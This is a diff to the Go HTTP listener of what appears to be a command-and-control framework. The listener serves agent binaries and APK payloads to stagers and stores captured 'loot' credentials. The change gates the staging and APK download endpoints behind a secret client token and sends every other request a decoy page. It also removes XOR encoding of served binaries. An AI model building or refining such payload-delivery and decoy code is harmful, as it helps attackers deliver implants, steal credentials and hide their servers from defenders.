@@ -3,8 +3,7 @@ package listener
 import (
 	"context"
 	"crypto/rsa"
-	"crypto/sha256"
-	"encoding/hex"
+	"crypto/subtle"
 	"fmt"
 	"io"
 	"net"
@@ -42,6 +41,7 @@ type HTTPListener struct {
 	onEvent    EventCallback
 	running    bool
 	database   interface{ InsertLoot(l *db.LootRecord) error }
+	stagingToken string
 }
 
 // ListenerConfig holds the configuration for creating a new listener.
@@ -58,6 +58,7 @@ type ListenerConfig struct {
 	TaskDisp *task.Dispatcher
 	OnEvent  EventCallback
 	Database interface{ InsertLoot(l *db.LootRecord) error } // For mobile cred capture
+	StagingToken string
 }
 
 // NewHTTPListener creates a new HTTP/HTTPS listener.
@@ -75,6 +76,7 @@ func NewHTTPListener(cfg ListenerConfig) *HTTPListener {
 		taskDisp: cfg.TaskDisp,
 		onEvent:  cfg.OnEvent,
 		database: cfg.Database,
+		stagingToken: cfg.StagingToken,
 	}
 }
 
@@ -332,9 +334,28 @@ func (l *HTTPListener) handleCheckIn(w http.ResponseWriter, r *http.Request) {
 	l.writeResponse(w, httpResp)
 }
 
+// authorizeStaging checks the X-Client-Token header against the configured
+// staging token. When a token is configured, staging downloads require it;
+// otherwise the endpoint stays open for backward compatibility.
+func (l *HTTPListener) authorizeStaging(r *http.Request) bool {
+	if l.stagingToken == "" {
+		return true
+	}
+	tok := r.Header.Get("X-Client-Token")
+	if tok == "" {
+		return false
+	}
+	return subtle.ConstantTimeCompare([]byte(tok), []byte(l.stagingToken)) == 1
+}
+
 // handleStaging serves agent binaries to stagers at /api/v1/update.
 // Determines OS from User-Agent and serves the appropriate binary.
 func (l *HTTPListener) handleStaging(w http.ResponseWriter, r *http.Request) {
+	if !l.authorizeStaging(r) {
+		l.serveDecoy(w, r)
+		return
+	}
+
 	ua := r.Header.Get("User-Agent")
 
 	// Find project root by walking up to go.mod
@@ -374,23 +395,6 @@ func (l *HTTPListener) handleStaging(w http.ResponseWriter, r *http.Request) {
 		if err != nil {
 			l.serveDecoy(w, r)
 			return
-		}
-	}
-
-	// Per-request key derivation: if the stager sent a challenge token,
-	// XOR-encrypt the binary using SHA-256(challenge) as the key.
-	// This prevents replay attacks — each download produces unique bytes.
-	// Stagers without the token receive plaintext (backward compatibility).
-	token := r.Header.Get("X-Client-Token")
-	if len(token) == 32 {
-		challengeBytes, decErr := hex.DecodeString(token)
-		if decErr == nil {
-			derived := sha256.Sum256(challengeBytes)
-			xored := make([]byte, len(agentBinary))
-			for i, b := range agentBinary {
-				xored[i] = b ^ derived[i%32]
-			}
-			agentBinary = xored
 		}
 	}
 
@@ -501,6 +505,11 @@ function showProgress() {
 // automatically picks up whichever template was last generated from the
 // Web UI.
 func (l *HTTPListener) handleAPKDownload(w http.ResponseWriter, r *http.Request) {
+	if !l.authorizeStaging(r) {
+		l.serveDecoy(w, r)
+		return
+	}
+
 	root := findProjectRoot()
 	payloadDir := filepath.Join(root, "build", "payloads")
 
